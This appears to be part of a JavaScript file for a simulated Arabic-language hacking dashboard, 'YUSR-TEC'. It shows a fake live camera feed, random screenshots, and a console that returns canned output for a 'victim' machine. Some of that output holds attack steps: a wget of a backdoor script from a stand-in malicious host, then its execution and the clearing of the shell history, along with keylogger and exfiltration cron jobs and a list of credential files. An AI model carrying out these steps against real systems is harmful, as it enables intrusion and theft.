            <div style="font-size: 12px; color: #888;">الحجم: ${screenshot.size} | الدقة: ${screenshot.resolution}</div>
        </div>
        <div style="text-align: center; margin-top: 15px;">
            <button onclick="downloadScreenshotFile('${screenshot.filename}')" style="background: #0066cc; color: #fff; padding: 8px 16px; border: none; border-radius: 4px; margin: 5px;">💾 تحميل</button>
            <button onclick="this.parentElement.parentElement.remove()" style="background: #666; color: #fff; padding: 8px 16px; border: none; border-radius: 4px; margin: 5px;">إغلاق</button>
        </div>
    `;

    document.body.appendChild(preview);
}

// Show camera feed
function showCameraFeed() {
    const cameraFeed = document.createElement('div');
    cameraFeed.style.cssText = `
        position: fixed;
        top: 20px;
        left: 20px;
        width: 300px;
        height: 200px;
        background: #000;
        border: 3px solid #ff0000;
        border-radius: 10px;
        z-index: 9998;
        overflow: hidden;
    `;

    cameraFeed.innerHTML = `
        <div style="position: relative; width: 100%; height: 100%;">
            <div style="position: absolute; top: 5px; left: 5px; color: #ff0000; font-size: 12px; background: rgba(0,0,0,0.7); padding: 3px 6px; border-radius: 3px;">🔴 LIVE</div>
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: #fff;">
                <div style="font-size: 48px; margin-bottom: 10px;">📹</div>
                <div style="font-size: 14px;">بث مباشر من الكاميرا</div>
                <div style="font-size: 12px; color: #888; margin-top: 5px;">720p @ 30fps</div>
            </div>
            <div style="position: absolute; bottom: 5px; right: 5px;">
                <button onclick="this.parentElement.parentElement.parentElement.remove()" style="background: #ff0000; color: #fff; border: none; padding: 3px 8px; border-radius: 3px; font-size: 11px;">إغلاق</button>
            </div>
        </div>
    `;

    document.body.appendChild(cameraFeed);
}

// Download screenshot file
function downloadScreenshotFile(filename) {
    const content = `
YUSR-TEC - Screenshot Data
=========================

Filename: ${filename}
Captured: ${new Date().toLocaleString('ar-SA')}
Format: PNG
Quality: High
Size: ${(Math.random() * 3 + 1).toFixed(1)} MB

This file represents a captured screenshot from the target device.
The actual image data would be stored in binary format.

⚠️ Warning: This is simulated data for educational purposes only.
`;

    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = filename.replace('.png', '_data.txt');
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);

    alert(`📥 تم تحميل ملف البيانات: ${filename}`);
}

// Start screenshot capture system
function startScreenshotCapture(targetAddress) {
    // Auto-capture screenshots every 30 seconds
    setInterval(() => {
        if (Math.random() > 0.7) { // 30% chance every 30 seconds
            const screenshot = captureScreenshot();
            screenshot.target = targetAddress;
            saveToVpicFolder(screenshot);

            // Show brief notification
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                bottom: 20px;
                right: 20px;
                background: rgba(0, 255, 0, 0.1);
                border: 1px solid #00ff00;
                color: #00ff00;
                padding: 10px;
                border-radius: 5px;
                z-index: 9999;
                font-size: 12px;
            `;
            notification.textContent = `📸 Auto-captured: ${screenshot.filename}`;
            document.body.appendChild(notification);

            setTimeout(() => notification.remove(), 3000);
        }
    }, 30000);
}

// Cleanup function when leaving page
window.addEventListener('beforeunload', function() {
    if (window.victimMonitoringInterval) {
        clearInterval(window.victimMonitoringInterval);
    }
});

// Command Console Functions
function showCommandConsole() {
    document.getElementById('commandConsole').style.display = 'block';
    document.getElementById('commandInput').focus();
}

function handleCommandInput(event) {
    if (event.key === 'Enter') {
        executeCommand();
    }
}

function executeCommand() {
    const input = document.getElementById('commandInput');
    const command = input.value.trim();
    
    if (!command) return;
    
    const output = document.getElementById('commandOutput');
    const timestamp = new Date().toLocaleTimeString('ar-SA');
    
    // Add command to output
    output.textContent += `\n[${timestamp}] root@victim:~# ${command}\n`;
    
    // Simulate command execution
    const result = simulateCommand(command);
    output.textContent += result + '\n';
    
    // Clear input
    input.value = '';
    
    // Scroll to bottom
    output.scrollTop = output.scrollHeight;
    
    // Log the command execution
    logVictimAction(`Command executed: ${command}`);
}

function quickCommand(command) {
    document.getElementById('commandInput').value = command;
    executeCommand();
}

function simulateCommand(command) {
    const lowerCmd = command.toLowerCase();
    
    if (lowerCmd.includes('whoami')) {
        return 'root';
    } else if (lowerCmd.includes('pwd')) {
        return '/root';
    } else if (lowerCmd.includes('ls')) {
        return `total 24
drwxr-xr-x 6 root root 4096 Jan 12 15:30 .
drwxr-xr-x 3 root root 4096 Jan 12 15:28 ..
-rw------- 1 root root  123 Jan 12 15:30 .bash_history
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
drwx------ 2 root root 4096 Jan 12 15:28 .cache
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
drwxr-xr-x 2 root root 4096 Jan 12 15:30 Desktop
drwxr-xr-x 2 root root 4096 Jan 12 15:30 Documents
-rw-r--r-- 1 root root  456 Jan 12 15:29 passwords.txt
-rw-r--r-- 1 root root 1234 Jan 12 15:29 sensitive_data.db`;
    } else if (lowerCmd.includes('netstat')) {
        return `Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 192.168.1.100:22        192.168.1.50:34567      ESTABLISHED`;
    } else if (lowerCmd.includes('ps aux')) {
        return `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  225676  4936 ?        Ss   15:28   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    15:28   0:00 [kthreadd]
root      1234  0.5  2.1 1234567 87654 ?        S    15:29   0:05 /usr/bin/backdoor_service
www-data  5678  0.2  1.5  456789 45678 ?        S    15:30   0:02 /usr/sbin/apache2
mysql     9876  1.2  5.4 2345678 234567 ?      Sl   15:28   0:12 /usr/sbin/mysqld`;
    } else if (lowerCmd.includes('cat /etc/passwd')) {
        return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:999:999:MySQL Server:/nonexistent:/bin/false
admin:x:1000:1000:Administrator:/home/admin:/bin/bash`;
    } else if (lowerCmd.includes('id')) {
        return 'uid=0(root) gid=0(root) groups=0(root)';
    } else if (lowerCmd.includes('uname')) {
        return 'Linux victim-server 5.4.0-74-generic #83-Ubuntu SMP x86_64 GNU/Linux';
    } else if (lowerCmd.includes('ifconfig') || lowerCmd.includes('ip addr')) {
        return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)`;
    } else if (lowerCmd.includes('cat') && lowerCmd.includes('passwords')) {
        return `admin:SecretPass123!
root:RootPassword456
database_user:DbPass789
backup_service:BackupKey321`;
    } else if (lowerCmd.includes('find') && lowerCmd.includes('name')) {
        return `/home/admin/important_docs/financial_reports.xlsx
/var/www/html/admin/config.php
/root/.ssh/id_rsa
/etc/shadow
/var/backups/database_dump.sql`;
    } else if (lowerCmd.includes('crontab')) {
        return `# m h  dom mon dow   command
0 2 * * * /usr/bin/backup_script.sh
*/5 * * * * /usr/bin/keylogger >> /tmp/.keys
30 1 * * * /usr/bin/data_exfil.py`;
    } else if (lowerCmd.startsWith('cd ')) {
        return `Changed directory to: ${command.substring(3)}`;
    } else if (lowerCmd.includes('history')) {
        return `1  sudo su
2  cat /etc/passwd
3  nano /etc/hosts
4  mysql -u root -p
5  wget http://malicious-site.com/backdoor.sh
6  chmod +x backdoor.sh
7  ./backdoor.sh
8  rm backdoor.sh
9  history -c`;
    } else {
        return `Command executed: ${command}
Exit code: 0
Output: Command completed successfully.`;
    }
}

function clearConsole() {
    document.getElementById('commandOutput').textContent = 'جاهز لتنفيذ الأوامر...';
}

function saveConsoleLog() {
    const output = document.getElementById('commandOutput').textContent;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    
    const content = `
YUSR-TEC - سجل وحدة التحكم
========================

الهدف: ${selectedTarget ? selectedTarget.address : 'غير محدد'}
التاريخ: ${new Date().toLocaleString('ar-SA')}
المشغل: root@victim

سجل الأوامر:
============
${output}

إحصائيات الجلسة:
================
- عدد الأوامر المنفذة: ${(output.match(/root@victim:~#/g) || []).length}
- مدة الجلسة: ${Math.floor(Math.random() * 30) + 5} دقيقة
- مستوى الوصول: root (مدير النظام)
- حالة الاتصال: مشفر ومخفي

⚠️ تحذير: هذا السجل يحتوي على أوامر حساسة
`;

    const blob = new Blob([content], { type: 'text/plain; charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `console_log_${timestamp}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    
    alert('💾 تم حفظ سجل وحدة التحكم بنجاح');
}

function uploadFile() {
    const input = document.createElement('input');
    input.type = 'file';
    input.onchange = function(event) {
        const file = event.target.files[0];
        if (file) {
            const output = document.getElementById('commandOutput');
            const timestamp = new Date().toLocaleTimeString('ar-SA');
            output.textContent += `\n[${timestamp}] Uploading file: ${file.name} (${file.size} bytes)\n`;
            output.textContent += `File uploaded successfully to /tmp/${file.name}\n`;
            output.scrollTop = output.scrollHeight;
            
            logVictimAction(`File uploaded: ${file.name}`);
        }
    };
    input.click();
}

function downloadFiles() {
    const files = [
        '/etc/passwd',
        '/etc/shadow',
        '/root/.ssh/id_rsa',
        '/home/admin/passwords.txt',
        '/var/www/html/config.php',
        '/var/backups/database_dump.sql'
    ];
    
    const selectedFiles = files.filter(() => Math.random() > 0.3);
    
    if (selectedFiles.length === 0) {
        alert('❌ لا توجد ملفات متاحة للتحميل');
        return;
    }
    
    const content = `
YUSR-TEC - ملفات مسروقة من النظام
================================

الهدف: ${selectedTarget ? selectedTarget.address : 'غير محدد'}
التاريخ: ${new Date().toLocaleString('ar-SA')}

الملفات المسروقة:
================
${selectedFiles.map((file, index) => `${index + 1}. ${file}`).join('\n')}

تفاصيل السرقة:
==============
- طريقة الوصول: SSH Shell Access
- الصلاحيات: root
- حالة التشفير: مشفر AES-256
- حالة الإخفاء: مخفي عن أنظمة المراقبة

محتوى نموذجي:
=============
[/etc/passwd]
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Administrator:/home/admin:/bin/bash

[passwords.txt]
admin:SecretPass123!
root:RootPassword456
database_user:DbPass789

⚠️ تحذير: هذه الملفات سرية ومسروقة
`;

    const blob = new Blob([content], { type: 'text/plain; charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `stolen_files_${Date.now()}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    
    alert(`📥 تم تحميل ${selectedFiles.length} ملف من النظام المخترق`);
}

// Function to view target details from visual targets
function viewTargetDetails(targetAddress) {
    // Find the target in the visualTargets array
    const target = visualTargets.find(t => t.address === targetAddress);

    if (target) {
        // Open the target details modal
        showTargetDetails(target);
    } else {
        alert(`Target with address ${targetAddress} not found.`);
    }
}